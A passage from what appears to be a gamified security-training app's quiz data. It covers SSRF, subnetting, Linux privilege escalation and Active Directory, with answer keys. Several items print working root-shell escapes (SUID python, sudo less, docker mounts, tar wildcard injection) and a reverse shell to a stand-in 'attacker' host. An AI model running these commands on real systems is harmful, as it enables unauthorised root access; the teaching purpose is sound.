          operationalContext: 'Questo esame pratico certifica la tua idoneità operativa per la sicurezza delle architetture cloud AWS, Azure e GCP.'
        },
        questions: [
          {
            id: 'q_ssrf_exam_1',
            title: 'SSRF Impact on Kubernetes Pods',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Hardcore',
            prompt: 'In a Kubernetes cluster, which sensitive endpoint is commonly targeted by SSRF to steal ServiceAccount tokens?',
            options: [
              { id: 'k8_1', text: 'https://kubernetes.default.svc/api and /var/run/secrets/kubernetes.io/serviceaccount', isCorrect: true },
              { id: 'k8_2', text: 'http://localhost:22/etc/shadow password dump socket', isCorrect: false },
              { id: 'k8_3', text: 'https://registry.npmjs.org/public package index download stream', isCorrect: false },
              { id: 'k8_4', text: 'http://127.0.0.1:53/bind9 DNS zone cache refresh port', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Kubernetes Cluster Security: ServiceAccount Token Theft',
              whyItWorks: 'Pods mount a JWT ServiceAccount token by default, allowing API server queries if network policies are missing.',
              patchRecommendation: 'Disable automountServiceAccountToken on pods that do not require Kubernetes API access.',
              terminalProof: '$ curl -k -H "Authorization: Bearer $(cat /var/run/secrets/.../token)" https://kubernetes.default.svc'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_ssrf_exam_2',
            title: 'Verify Safe URL Whitelist Architecture',
            type: 'multiple_choice',
            domain: 'Web Sec',
            difficulty: 'Intermediate',
            prompt: 'What is the most secure software architecture pattern to prevent SSRF when downloading external resources?',
            options: [
              { id: 'k8_wh1', text: 'Resolve DNS, reject non-routable/private IP ranges, and fetch via isolated egress proxy', isCorrect: true },
              { id: 'k8_wh2', text: 'Use a regex blacklist filtering out strings containing "localhost" and "127.0.0.1"', isCorrect: false },
              { id: 'k8_wh3', text: 'Execute the HTTP request using root privileges to ensure complete system access', isCorrect: false },
              { id: 'k8_wh4', text: 'Encode all requested URLs using Base64 before dispatching over the network', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Defensive Architecture: Egress Filtering & Validation',
              whyItWorks: 'Resolving DNS and verifying against RFC 1918 / RFC 3927 before connecting defeats DNS rebinding and IP obfuscation.',
              patchRecommendation: 'Deploy dedicated egress proxies that enforce protocol (https only) and domain whitelists.',
              terminalProof: '[Proxy-Block] Outbound connection to 169.254.169.254 dropped by egress policy'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 6: RETI & SUBNETTING (Packet Analysis & Routing)
  // =========================================================================
  {
    id: 'mod_subnetting',
    title: 'RETI & SUBNETTING',
    certificationFocus: 'Cisco CCNA 200-301 & CompTIA Network+',
    color: '#6366F1',
    nodes: [
      {
        id: 'node_net_1',
        title: 'CIDR Notation & Subnet Masks',
        subtitle: 'IPv4 bit manipulation: calculating subnets from /24 down to /30',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Notazione CIDR e Calcolo delle Subnet',
          keyTakeaway: 'La maschera di sottorete divide l\'IP in Network ID e Host ID. Una /24 ha 256 indirizzi (254 host utili); una /28 ha 16 indirizzi (14 host utili).',
          syntaxExample: '192.168.1.0/24 -> Maschera: 255.255.255.0 (254 host)\n192.168.1.0/28 -> Maschera: 255.255.255.240 (14 host)',
          operationalContext: 'Il subnetting corretto segmenta le reti di produzione, isolando i database dai web server esposti su internet.'
        },
        questions: [
          {
            id: 'q_sub_cidr',
            title: 'Calculate Usable Hosts for /28 Subnet',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'How many usable host IP addresses are available in a standard IPv4 /28 subnet?',
            options: [
              { id: 'sb_1', text: '14 usable hosts (16 total - network - broadcast)', isCorrect: true },
              { id: 'sb_2', text: '16 usable hosts (all addresses assignable)', isCorrect: false },
              { id: 'sb_3', text: '30 usable hosts (standard departmental size)', isCorrect: false },
              { id: 'sb_4', text: '62 usable hosts (half-class C allocation)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IPv4 Subnetting Mathematics: Formula 2^(32-prefix) - 2',
              whyItWorks: '32 - 28 = 4 bits for hosts. 2^4 = 16. Subtracting Network and Broadcast leaves 14 assignable IPs.',
              patchRecommendation: 'Use point-to-point /30 or /31 subnets for interconnecting router links to avoid address exhaustion.',
              terminalProof: '$ ipcalc 192.168.1.0/28\nHosts/Net: 14'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sub_2',
        title: 'Network ID, Broadcast & Usable Range',
        subtitle: 'First address (network), last address (broadcast) and gateway allocation',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Indirizzi di Rete e Indirizzo di Broadcast',
          keyTakeaway: 'Il primo indirizzo di una subnet (tutti i bit host a 0) identifica la rete; l\'ultimo indirizzo (tutti i bit host a 1) è il broadcast per inviare pacchetti a tutti gli host.',
          syntaxExample: 'Rete: 10.0.0.0/24\nPrimo Host: 10.0.0.1\nUltimo Host: 10.0.0.254\nBroadcast: 10.0.0.255',
          operationalContext: 'Gli attacchi Smurf sfruttano l\'indirizzo di broadcast per amplificare pacchetti ICMP spoofati contro una vittima.'
        },
        questions: [
          {
            id: 'q_sub_broadcast',
            title: 'Identify Broadcast Address for 192.168.10.0/26',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'What is the broadcast IP address for the subnet block 192.168.10.0/26 (mask 255.255.255.192)?',
            options: [
              { id: 'bc_1', text: '192.168.10.63 (last address in 64-block)', isCorrect: true },
              { id: 'bc_2', text: '192.168.10.64 (first address of next subnet)', isCorrect: false },
              { id: 'bc_3', text: '192.168.10.255 (class C default broadcast)', isCorrect: false },
              { id: 'bc_4', text: '192.168.10.127 (half-block broadcast)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CIDR Subnet Boundary Calculations',
              whyItWorks: '/26 provides blocks of 64 addresses: 0-63, 64-127, etc. The broadcast of the first block is .63.',
              patchRecommendation: 'Never assign network or broadcast IPs to static host configurations.',
              terminalProof: '$ ipcalc 192.168.10.0/26\nBroadcast: 192.168.10.63'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sub_3',
        title: 'Routing Tables & Default Gateways',
        subtitle: 'Next-hop routing logic, 0.0.0.0/0 default route, and metrics',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Tabelle di Routing e Default Gateway',
          keyTakeaway: 'I router inoltrano i pacchetti confrontando l\'IP di destinazione con la tabella di routing usando la regola del "Longest Prefix Match". La rotta 0.0.0.0/0 è il Default Gateway.',
          syntaxExample: '$ ip route show\ndefault via 192.168.1.1 dev eth0 proto dhcp metric 100\n10.0.0.0/8 via 10.1.1.254 dev eth1',
          operationalContext: 'Se un attaccante compromette il Default Gateway, può condurre un Man-In-The-Middle totale su tutto il traffico in uscita.'
        },
        questions: [
          {
            id: 'q_sub_routing',
            title: 'Longest Prefix Match Routing Decision',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'A packet is destined for 10.1.2.5. The router has routes for 10.0.0.0/8, 10.1.0.0/16, and 10.1.2.0/24. Which route is chosen?',
            options: [
              { id: 'rt_1', text: '10.1.2.0/24 (Most specific longest prefix match)', isCorrect: true },
              { id: 'rt_2', text: '10.0.0.0/8 (Largest encompassing network block)', isCorrect: false },
              { id: 'rt_3', text: '10.1.0.0/16 (Medium tier class B compromise)', isCorrect: false },
              { id: 'rt_4', text: '0.0.0.0/0 (Default gateway takes unconditional precedence)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IP Routing Algorithms: Longest Prefix Match (LPM)',
              whyItWorks: 'Routers always prioritize the route with the highest number of matching leading prefix bits (/24 over /16).',
              patchRecommendation: 'Audit routing tables to ensure rogue routes with high specificity are not injected via BGP or OSPF.',
              terminalProof: '$ ip route get 10.1.2.5\n10.1.2.5 via 192.168.1.1 dev eth0 src 10.1.2.100'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sub_4',
        title: 'ARP Protocol & Anti-Spoofing Defense',
        subtitle: 'Resolving IP to MAC addresses and detecting ARP Poisoning (MitM)',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Protocollo ARP e Avvelenamento della Cache (MitM)',
          keyTakeaway: 'ARP mappa indirizzi IP logici a MAC address fisici a livello Data Link. Essendo privo di autenticazione, un attaccante può inviare risposte ARP gratuite fasulle (ARP Poisoning).',
          syntaxExample: '$ arp -a\n? (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0\n# Se due IP diversi hanno lo stesso MAC, c\'è uno spoofing in corso!',
          operationalContext: 'Dynamic ARP Inspection (DAI) sugli switch enterprise verifica i pacchetti ARP confrontandoli con il database DHCP Snooping.'
        },
        questions: [
          {
            id: 'q_sub_arp',
            title: 'Enterprise Switch Defense against ARP Poisoning',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Which security feature on managed switches validates ARP packets against DHCP snooping bindings to prevent MitM?',
            options: [
              { id: 'ap_1', text: 'DAI (Dynamic ARP Inspection)', isCorrect: true },
              { id: 'ap_2', text: 'BPDU Guard (Spanning Tree loop defense)', isCorrect: false },
              { id: 'ap_3', text: 'Port Fast (Rapid transition to forwarding)', isCorrect: false },
              { id: 'ap_4', text: 'CDP (Cisco Discovery Protocol neighbor query)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Data Link Layer Security: ARP Poisoning Mitigation',
              whyItWorks: 'Dynamic ARP Inspection intercepts all ARP requests/responses and drops invalid IP-to-MAC mappings.',
              patchRecommendation: 'Enable DHCP Snooping first, then activate Dynamic ARP Inspection on access VLANs.',
              terminalProof: '%SW_DAI-4-INVALID_ARP: 1 invalid ARP packets received on Gi0/1'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sub_5',
        title: 'VLAN Segmentation & 802.1Q Tagging',
        subtitle: 'Broadcast domain isolation, trunk links, and VLAN hopping attack vectors',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Segmentazione VLAN e Tagging IEEE 802.1Q',
          keyTakeaway: 'Le VLAN (Virtual LAN) frammentano i domini di broadcast su base logica. I collegamenti Trunk trasportano più VLAN aggiungendo un tag 802.1Q di 4 byte nell\'header Ethernet.',
          syntaxExample: 'Switch(config)# vlan 10\nSwitch(config-vlan)# name DMZ_SERVERS\nSwitch(config-if)# switchport mode access\nSwitch(config-if)# switchport access vlan 10',
          operationalContext: 'Disabilitare il Dynamic Trunking Protocol (DTP) e cambiare la Native VLAN impedisce gli attacchi di Double Tagging (VLAN Hopping).'
        },
        questions: [
          {
            id: 'q_sub_vlan',
            title: 'Prevent VLAN Hopping Exploitation',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'What configuration hardening step neutralizes switch spoofing VLAN hopping attacks on user access ports?',
            options: [
              { id: 'vl_1', text: 'Explicitly set switchport mode access and disable Dynamic Trunking Protocol (DTP)', isCorrect: true },
              { id: 'vl_2', text: 'Set all access ports to negotiate trunking automatically with incoming client devices', isCorrect: false },
              { id: 'vl_3', text: 'Assign VLAN 1 as the active native VLAN across all production user interfaces', isCorrect: false },
              { id: 'vl_4', text: 'Disable Spanning Tree Protocol (STP) across all trunk connections', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Switch Hardening: VLAN Hopping & DTP Spoofing',
              whyItWorks: 'Enforcing static access mode prevents an attacker from sending DTP packets to convert the port into a trunk.',
              patchRecommendation: 'Run: switchport nonegotiate and switchport mode access on all end-user ports.',
              terminalProof: 'Switch# show interfaces status\nGi0/1  disabled  auto  auto  10/100/1000BaseTX'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_sub_6',
        title: 'Final Test: Subnetting & Routing Calculation',
        subtitle: 'Comprehensive evaluation on IP math, routing decisions, CIDR masks and VLAN architecture',
        moduleId: 'mod_subnetting',
        status: 'available',
        domain: 'Networking',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Subnetting',
          keyTakeaway: 'Verifica la tua velocità di calcolo su maschere CIDR, determinazione delle subnet broadcast e architettura di routing.',
          syntaxExample: '$ ip route add 172.16.0.0/16 via 10.0.0.1\n$ iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE',
          operationalContext: 'Questo esame pratico certifica la tua idoneità per le domande di calcolo subnetting dell\'esame Cisco CCNA.'
        },
        questions: [
          {
            id: 'q_sub_exam_1',
            title: 'Point-to-Point WAN Link Subnet Mask',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Hardcore',
            prompt: 'Which subnet mask provides exactly 2 assignable host addresses for a point-to-point router connection without wasting IPs?',
            options: [
              { id: 'sx_1', text: '/30 (255.255.255.252 - exactly 2 usable hosts)', isCorrect: true },
              { id: 'sx_2', text: '/29 (255.255.255.248 - 6 usable hosts)', isCorrect: false },
              { id: 'sx_3', text: '/28 (255.255.255.240 - 14 usable hosts)', isCorrect: false },
              { id: 'sx_4', text: '/32 (255.255.255.255 - single loopback host)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'IPv4 Address Conservation: /30 Point-to-Point Links',
              whyItWorks: '/30 has 4 total addresses: Network, Router A, Router B, Broadcast. RFC 3021 also defines /31 for modern links.',
              patchRecommendation: 'Use /30 or /31 subnets on all dedicated point-to-point router interfaces.',
              terminalProof: '$ ipcalc 10.0.0.0/30\nHosts/Net: 2'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_sub_exam_2',
            title: 'Private IP Range Specification (RFC 1918)',
            type: 'multiple_choice',
            domain: 'Networking',
            difficulty: 'Intermediate',
            prompt: 'Which of the following IP blocks is NOT reserved for private non-internet-routable networks under RFC 1918?',
            options: [
              { id: 'sx_rfc1', text: '172.32.0.0/16 (Public routable IP space)', isCorrect: true },
              { id: 'sx_rfc2', text: '10.0.0.0/8 (Private Class A space)', isCorrect: false },
              { id: 'sx_rfc3', text: '172.16.0.0/12 (Private Class B space 172.16 - 172.31)', isCorrect: false },
              { id: 'sx_rfc4', text: '192.168.0.0/16 (Private Class C space)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'RFC 1918 Address Allocation for Private Internets',
              whyItWorks: 'Private class B ranges from 172.16.0.0 to 172.31.255.255. 172.32.0.0 is public routable space.',
              patchRecommendation: 'Ensure egress firewalls drop any packets with RFC 1918 source addresses escaping to public interfaces.',
              terminalProof: 'Route check: 172.32.1.1 routed to public transit BGP'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 7: LINUX PRIVILEGE ESCALATION (Low Level Systems)
  // =========================================================================
  {
    id: 'mod_linux',
    title: 'LINUX PRIVILEGE ESCALATION',
    certificationFocus: 'CompTIA PenTest+ PT0-002 & OSCP',
    color: '#EAB308',
    nodes: [
      {
        id: 'node_lin_1',
        title: 'Privilege Boundaries & ID Auditing',
        subtitle: 'Inspecting real vs effective UID/GID, sudo privileges and groups',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Confini di Privilegio e Identità Linux',
          keyTakeaway: 'Il comando "id" mostra UID (User ID), GID (Group ID) e gruppi secondari. Se fai parte del gruppo "docker" o "lxd", ottenere root è banale.',
          syntaxExample: '$ id\nuid=1001(operator) gid=1001(operator) groups=1001(operator),115(docker)\n$ sudo -l',
          operationalContext: 'L\'appartenenza a gruppi privileged (docker, disk, adm) consente la lettura diretta dei blocchi disco o il montaggio del filesystem root.'
        },
        questions: [
          {
            id: 'q_pe_groups',
            title: 'Identify Critical Dangerous User Group',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'An attacker gains access to a low-privileged shell. Membership in which group provides an immediate path to root via container volume mount?',
            options: [
              { id: 'pg_1', text: 'docker (mount root filesystem / onto container)', isCorrect: true },
              { id: 'pg_2', text: 'audio (access hardware sound card devices)', isCorrect: false },
              { id: 'pg_3', text: 'dialout (access serial communication ports)', isCorrect: false },
              { id: 'pg_4', text: 'plugdev (mount removable external USB devices)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Local Privilege Escalation via Docker Socket',
              whyItWorks: 'Access to the docker daemon allows running: docker run -v /:/mnt alpine chroot /mnt to gain host root.',
              patchRecommendation: 'Never add unprivileged users to the docker group; use rootless containers (Podman).',
              terminalProof: '$ docker run -it -v /:/mnt alpine\n# whoami\nroot'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_lin_2',
        title: 'SUID/SGID Binaries & find -perm',
        subtitle: 'Exploiting binaries that run with owner permissions to spawn root shells',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Binari SUID e GTFOBins',
          keyTakeaway: 'I file con bit SUID (-4000) vengono eseguiti con i permessi del proprietario del file (spesso root). Se un binario come /usr/bin/find o vim ha SUID, permette lo shell escape.',
          syntaxExample: '$ find / -perm -4000 -type f 2>/dev/null\n$ /usr/bin/find . -exec /bin/sh -p \\; -quit',
          operationalContext: 'L\'auditing dei binari SUID deve rimuovere il bit dai comandi non strettamente necessari (chmod u-s /path/to/binary).'
        },
        questions: [
          {
            id: 'q_pe_suid',
            title: 'Spot the Bug: Insecure SUID Binary Finding',
            type: 'spot_the_zeroday',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'The audit script lists SUID binaries. TAP THE LINE showing an exploitable GTFOBins SUID binary:',
            codeLines: [
              { lineNum: 1, code: '/usr/bin/passwd' },
              { lineNum: 2, code: '/usr/bin/sudo' },
              { lineNum: 3, code: '/usr/bin/python3 -s (SUID bit set by sysadmin)', isVulnerable: true, vulnerabilityHint: 'python3 with SUID allows immediate root: python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"' },
              { lineNum: 4, code: '/usr/bin/newgrp' }
            ],
            options: [
              { id: 'st_suid1', text: 'Line 3: /usr/bin/python3 with SUID bit set', isCorrect: true },
              { id: 'st_suid2', text: 'Line 1: standard passwd utility', isCorrect: false },
              { id: 'st_suid3', text: 'Line 2: standard sudo utility', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'GTFOBins: Python SUID Local Privilege Escalation',
              whyItWorks: 'Scripting runtimes (python, perl, bash) with SUID can spawn unconstrained root interactive shells.',
              patchRecommendation: 'Run: chmod u-s /usr/bin/python3 immediately.',
              terminalProof: '$ python3 -c \'import os; os.execl("/bin/sh", "sh", "-p")\'\n# whoami\nroot'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_lin_3',
        title: 'Sudo Misconfigurations: sudo -l & NOPASSWD',
        subtitle: 'Exploiting wildcard permissions, LD_PRELOAD, and application escapes',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Misconfigurazioni in /etc/sudoers',
          keyTakeaway: '"sudo -l" elenca i comandi eseguibili dall\'utente con privilegi root. Se include "NOPASSWD" o flag "env_keep += LD_PRELOAD", l\'escalation è garantita.',
          syntaxExample: 'User operator may run the following commands on target:\n    (ALL) NOPASSWD: /usr/bin/less /var/log/syslog\n# In less, digita "!/bin/sh" per uscire con shell root!',
          operationalContext: 'Non consentire mai sudo NOPASSWD su editor di testo, visualizzatori di log (less/more) o interpreti di comando.'
        },
        questions: [
          {
            id: 'q_pe_sudo',
            title: 'Escape to Root Shell from less Utility',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'An operator can run "sudo less /var/log/boot.log" without a password. What interactive keystroke escapes to a root shell?',
            options: [
              { id: 'sd_1', text: '!/bin/sh (invokes shell escape inside less pager)', isCorrect: true },
              { id: 'sd_2', text: 'Ctrl+C followed by typing "sudo su -"', isCorrect: false },
              { id: 'sd_3', text: ':w /root/secret.txt to dump screen buffers', isCorrect: false },
              { id: 'sd_4', text: 'q! to kill the parent process tree', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'GTFOBins: sudo less Privilege Escalation',
              whyItWorks: 'less supports spawning shell commands via the ! prefix; running under sudo elevates the spawned shell to root.',
              patchRecommendation: 'Use sudoers NOEXEC tag: (ALL) NOEXEC: /usr/bin/less to disable shell escapes.',
              terminalProof: '$ sudo less /var/log/boot.log\n:!/bin/sh\n# whoami\nroot'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_lin_4',
        title: 'Insecure Cron Jobs & Writable Paths',
        subtitle: 'Hijacking periodic root scripts, relative paths, and tar wildcards',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Task Cron Vulnerabili e Permessi di Scrittura',
          keyTakeaway: 'I file in /etc/crontab e /etc/cron.d/ vengono eseguiti periodicamente con privilegi root. Se uno script richiamato ha permessi di scrittura per gli utenti (777), l\'attaccante può modificarlo per ottenere una reverse shell.',
          syntaxExample: '# /etc/crontab\n* * * * * root /opt/backup.sh\n# Se /opt/backup.sh è scrivibile:\n$ echo "chmod +s /bin/bash" >> /opt/backup.sh',
          operationalContext: 'Verifica sempre che gli script eseguiti da cron siano di proprietà root:root con permessi 700 o 755.'
        },
        questions: [
          {
            id: 'q_pe_cron',
            title: 'Exploit Writable Cron Script',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'A root cron job executes /usr/local/bin/cleanup.sh every 5 minutes. The file has permissions -rwxrwxrwx (777). How does an attacker gain root?',
            options: [
              { id: 'cr_1', text: 'Append a reverse shell command to cleanup.sh and wait for cron trigger', isCorrect: true },
              { id: 'cr_2', text: 'Delete /etc/crontab using unprivileged rm command', isCorrect: false },
              { id: 'cr_3', text: 'Change the system time using the date utility to trigger cron early', isCorrect: false },
              { id: 'cr_4', text: 'Rename cleanup.sh to /bin/bash to replace the system shell', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'CWE-732: Writable Cron Job Script Exploitation',
              whyItWorks: 'The cron daemon executes the script as root; any modifications execute with full root privileges.',
              patchRecommendation: 'Set strict permissions: chown root:root cleanup.sh && chmod 700 cleanup.sh.',
              terminalProof: '$ echo "nc -e /bin/sh attacker 4444" >> cleanup.sh'
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_lin_5',
        title: 'Kernel Exploits & Capabilities Hardening',
        subtitle: 'Dirty COW, PwnKit, and replacing setuid with Linux capabilities (cap_setuid)',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Exploit del Kernel e Linux Capabilities',
          keyTakeaway: 'Le vulnerabilità del kernel (es. Dirty COW, PwnKit CVE-2021-4034) derivano da bug di race condition nella gestione della memoria. Le Linux Capabilities dividono i poteri di root in permessi granulari (es. CAP_NET_BIND_SERVICE).',
          syntaxExample: '$ uname -a\n$ getcap -r / 2>/dev/null\n/usr/bin/ping = cap_net_raw+ep',
          operationalContext: 'Assegnare la capability cap_setuid+ep a un eseguibile equivale a renderlo SUID root.'
        },
        questions: [
          {
            id: 'q_pe_kernel',
            title: 'Identify Dangerous Linux Capability',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Intermediate',
            prompt: 'Which Linux capability assigned to a binary allows it to arbitrary manipulate process User IDs to become root?',
            options: [
              { id: 'cp_1', text: 'CAP_SETUID (Permits arbitrary manipulation of process UIDs)', isCorrect: true },
              { id: 'cp_2', text: 'CAP_NET_BIND_SERVICE (Permits binding to ports below 1024)', isCorrect: false },
              { id: 'cp_3', text: 'CAP_SYS_TIME (Permits modification of system real-time clock)', isCorrect: false },
              { id: 'cp_4', text: 'CAP_SYS_CHROOT (Permits use of the chroot system call)', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Linux Capabilities Misconfiguration: CAP_SETUID',
              whyItWorks: 'CAP_SETUID allows an unprivileged process to call setuid(0) to escalate directly to root.',
              patchRecommendation: 'Audit capabilities: getcap -r / 2>/dev/null; remove unnecessary capabilities with setcap -r.',
              terminalProof: '$ /usr/bin/perl -e \'use POSIX qw(setuid); setuid(0); exec "/bin/sh";\''
            },
            xpReward: 60,
            eloReward: 15
          }
        ]
      },
      {
        id: 'node_lin_6',
        title: 'Final Test: Linux Local Root Challenge',
        subtitle: 'Comprehensive evaluation on SUID discovery, sudo exploitation, cron hijacking and root escalation',
        moduleId: 'mod_linux',
        status: 'available',
        domain: 'Linux & Bash',
        xpReward: 120,
        eloReward: 35,
        isFinalTest: true,
        lessonExplanation: {
          conceptTitle: 'Esame Finale della Missione Privilege Escalation',
          keyTakeaway: 'Dimostra la piena capacità di condurre un audit completo di post-exploitation, identificare la falla di configurazione e scalare a root.',
          syntaxExample: '$ linpeas.sh | grep -E "RED/YELLOW|Vulnerable"',
          operationalContext: 'Questo esame pratico certifica le competenze richieste per la certificazione Offensive Security Certified Professional (OSCP).'
        },
        questions: [
          {
            id: 'q_lin_exam_1',
            title: 'NFS No_root_squash Local Escalation',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'In /etc/exports, a share is configured with "no_root_squash". How does an attacker exploit this to gain local root on the target host?',
            options: [
              { id: 'le_1', text: 'Mount the share from attacker machine as root, create SUID /bin/bash, and run it on target', isCorrect: true },
              { id: 'le_2', text: 'Sniff unencrypted NFS packets to extract local /etc/shadow hashes', isCorrect: false },
              { id: 'le_3', text: 'Crash the RPC daemon to cause a kernel panic and restart into single-user mode', isCorrect: false },
              { id: 'le_4', text: 'Modify the export file permissions using an anonymous FTP upload trick', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'NFS Misconfiguration: no_root_squash SUID Creation',
              whyItWorks: 'no_root_squash disables UID remapping; the remote root user writes SUID binaries that execute as host root.',
              patchRecommendation: 'Always enforce root_squash (maps remote root to nobody) on all exported NFS directories.',
              terminalProof: 'Target: /bin/bash -p\n# whoami\nroot'
            },
            xpReward: 60,
            eloReward: 17
          },
          {
            id: 'q_lin_exam_2',
            title: 'Exploit Wildcard Injection in Tar Backup Script',
            type: 'multiple_choice',
            domain: 'Linux & Bash',
            difficulty: 'Hardcore',
            prompt: 'A root cron job runs "tar -czf backup.tar.gz *". How can a local user abuse the asterisk wildcard to execute commands?',
            options: [
              { id: 'le_tar1', text: 'Create files named "--checkpoint=1" and "--checkpoint-action=exec=sh root.sh"', isCorrect: true },
              { id: 'le_tar2', text: 'Create a symlink pointing backup.tar.gz to /dev/null', isCorrect: false },
              { id: 'le_tar3', text: 'Execute killall tar concurrently in an infinite bash loop', isCorrect: false },
              { id: 'le_tar4', text: 'Append 1GB of zero bytes to backup.tar.gz to fill the disk', isCorrect: false }
            ],
            rootCauseBreakdown: {
              cveOrTopic: 'Wildcard Injection: Shell Argument Injection in Tar',
              whyItWorks: 'The shell expands * into filenames; files named like flags are parsed by tar as command line arguments.',
              patchRecommendation: 'Never use raw wildcards with tar in root scripts; use explicit paths or -- separator.',
              terminalProof: '$ touch -- "--checkpoint=1"\n$ touch -- "--checkpoint-action=exec=sh root.sh"'
            },
            xpReward: 60,
            eloReward: 18
          }
        ]
      }
    ]
  },

  // =========================================================================
  // MISSION 8: ACTIVE DIRECTORY ATTACK (Enterprise Identity)
  // =========================================================================
  {
    id: 'mod_active_directory',
    title: 'ACTIVE DIRECTORY ATTACK',
    certificationFocus: 'OffSec PEN-300 / OSEP & CompTIA Security+',
    color: '#EC4899',
    nodes: [
      {
        id: 'node_ad_kerberoast',
        title: 'Active Directory Architecture & Kerberos KDC',
        subtitle: 'Domain Controllers, LDAP queries, and the Kerberos authentication realm',
        moduleId: 'mod_active_directory',
        status: 'available',
        domain: 'Defense & SOC',
        xpReward: 60,
        eloReward: 15,
        lessonExplanation: {
          conceptTitle: 'Architettura Active Directory e Kerberos',
          keyTakeaway: 'Active Directory centralizza identità e permessi in domini Windows. L\'autenticazione usa Kerberos: il KDC emette TGT (Ticket Granting Ticket) e TGS (Ticket Granting Service).',
          syntaxExample: '$ net user /domain\n$ nltest /dclist:corp.local',
          operationalContext: 'Compromettere un singolo account utente standard consente di interrogare l\'intero catalogo globale AD tramite LDAP.'
        },
        questions: [
          {
            id: 'q_ad_kdc',
            title: 'Role of Kerberos Key Distribution Center (KDC)',
            type: 'multiple_choice',
            domain: 'Defense & SOC',
            difficulty: 'Intermediate',
            prompt: 'Which two fundamental sub-services comprise the Kerberos Key Distribution Center (KDC) running on Domain Controllers?',
            options: [
              { id: 'kd_1', text: 'Authentication Service (AS) and Ticket Granting Service (TGS)', isCorrect: true },
              { id: 'kd_2', text: 'Domain Name System (DNS) and Dynamic Host Configuration (DHCP)', isCorrect: false },
